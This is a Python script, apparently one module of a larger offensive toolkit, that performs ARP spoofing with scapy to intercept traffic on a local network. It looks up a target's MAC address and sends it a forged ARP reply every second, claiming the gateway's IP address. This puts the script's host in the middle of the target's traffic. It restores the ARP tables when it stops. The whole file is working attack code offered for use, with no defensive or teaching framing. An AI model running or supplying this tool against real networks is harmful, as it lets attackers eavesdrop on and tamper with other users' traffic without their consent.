#!/usr/bin/env python3
"""
ARP Spoofer Module
Perform ARP spoofing to intercept traffic on a local network
"""

import os
import sys
import time
import signal

try:
    from scapy.all import Ether, ARP, sendp, get_if_hwaddr
except ImportError:
    print("Error: scapy not installed. Install with: pip install scapy")
    sys.exit(1)

def get_mac(ip):
    """Get MAC address for IP"""
    try:
        from scapy.all import ARP, srp
        arp_request = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp_request
        result = srp(packet, timeout=2, verbose=False)[0]
        return result[0][1].hwsrc if result else None
    except:
        return None

def spoof(target_ip, spoof_ip, interface="eth0"):
    """Send spoofed ARP packets"""
    try:
        target_mac = get_mac(target_ip)
        if not target_mac:
            print(f"Could not find MAC for {target_ip}")
            return False
        
        packet = Ether(dst=target_mac)/ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        sendp(packet, iface=interface, verbose=False)
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False

def restore(target_ip, gateway_ip, interface="eth0"):
    """Restore original ARP tables"""
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        
        if target_mac and gateway_mac:
            packet = Ether(dst=target_mac)/ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
            sendp(packet, iface=interface, count=5, verbose=False)
    except Exception as e:
        print(f"Restore error: {e}")

def main():
    target_ip = os.getenv('ARG_TARGET_IP')
    gateway_ip = os.getenv('ARG_GATEWAY_IP')
    interface = os.getenv('ARG_INTERFACE', 'eth0')
    duration = int(os.getenv('ARG_DURATION', '60'))
    
    if not target_ip or not gateway_ip:
        print("Error: target_ip and gateway_ip required")
        sys.exit(1)
    
    print(f"[*] Starting ARP spoof: {target_ip} -> {gateway_ip}")
    print(f"[*] Interface: {interface}, Duration: {duration}s")
    
    start_time = time.time()
    packet_count = 0
    
    def signal_handler(sig, frame):
        print(f"\n[*] Restoring ARP tables...")
        restore(target_ip, gateway_ip, interface)
        print("[+] Done")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        while True:
            if duration > 0 and (time.time() - start_time) >= duration:
                break
            
            if spoof(target_ip, gateway_ip, interface):
                packet_count += 1
                print(f"[+] Sent {packet_count} packets", end='\r')
            
            time.sleep(1)
        
        restore(target_ip, gateway_ip, interface)
        print(f"\n[+] Spoofing complete. Sent {packet_count} packets")
    except Exception as e:
        print(f"\nError: {e}")
        restore(target_ip, gateway_ip, interface)
        sys.exit(1)

if __name__ == "__main__":
    main()
